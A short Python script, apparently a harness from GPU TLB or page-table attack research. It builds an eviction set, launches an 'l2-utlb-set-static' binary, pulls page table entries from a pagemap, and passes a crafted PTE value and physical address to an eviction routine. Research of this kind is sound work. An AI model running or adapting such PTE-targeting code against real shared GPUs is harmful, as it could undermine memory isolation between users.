#!/usr/bin/python3

import pagemap
import sys
from run_util import *
from eviction_sets import get_eviction_set

if len(sys.argv) > 1:
    SMID1 = sys.argv[1]
else:
    SMID1 = "1"


eviction_set = get_eviction_set(18, n=5, indexed=True)
target = eviction_set[0]
# eviction_set[2] += 10
eviction_set = list(map(str, eviction_set))

cmd = ["./l2-utlb-set-static", SMID1] + eviction_set
print(f"[*] cmd: {' '.join(cmd)}")
prepare(cmd)

# extract PTEs from the pagemap
target_va = target_va + target * (1 * 1024 * 1024)
ptes = pagemap.retrieve_ptes(tmp_path + 'pagemap')
pte_pa = ptes[target_va][1]
pte_val = pagemap.make_pte_value(ptes[dummy_va][0])

launch_eviction(cmd, pte_pa, pte_val, sleep_time=8)
